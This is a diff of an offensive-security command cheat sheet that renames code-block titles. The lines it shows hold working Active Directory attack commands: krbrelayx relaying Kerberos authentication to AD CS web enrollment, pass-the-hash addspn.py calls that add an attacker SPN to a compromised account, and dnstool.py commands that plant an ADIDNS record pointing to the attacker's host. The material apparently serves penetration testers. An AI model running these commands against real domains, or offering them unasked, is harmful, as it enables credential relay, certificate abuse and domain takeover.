@@ -28,7 +28,7 @@ var nt_hash
 
 Relay Kerberos authentication to AD CS web enrollment.
 
-```sh title:"Relay Kerberos auth to AD CS"
+```sh title:"krbrelayx Relay Kerberos auth to AD CS"
 krbrelayx.py --target "http://$ca_fqdn/certsrv" --adcs --template "$template_name" --victim "$victim_fqdn"
 ```
 <!-- cheat
@@ -43,7 +43,7 @@ var victim_fqdn
 
 Add an SPN to a compromised account so Kerberos authentication can be routed to the attacker host.
 
-```sh title:"Add attacker SPN with addspn.py"
+```sh title:"krbrelayx Add attacker SPN with addspn.py"
 addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn"
 ```
 <!-- cheat
@@ -58,7 +58,7 @@ var dc_fqdn
 
 Clean up the added SPN.
 
-```sh title:"Remove attacker SPN with addspn.py"
+```sh title:"krbrelayx Remove attacker SPN with addspn.py"
 addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn" --delete
 ```
 <!-- cheat
@@ -73,7 +73,7 @@ var dc_fqdn
 
 Add an ADIDNS record pointing the attacker FQDN to your host.
 
-```sh title:"Add attacker DNS record with dnstool"
+```sh title:"krbrelayx Add attacker DNS record with dnstool"
 dnstool.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -r "$attacker_fqdn" -d "$lhost" --action add "$dc_fqdn"
 ```
 <!-- cheat
@@ -89,7 +89,7 @@ var dc_fqdn
 
 Check the ADIDNS record before or after cleanup.
 
-```sh title:"Query ADIDNS record with dnstool"
+```sh title:"krbrelayx Query ADIDNS record with dnstool"
 dnstool.py -u "$domain/$user" -p "$pass" --record "$attacker_fqdn" --action query "$dc_fqdn"
 ```
 <!-- cheat
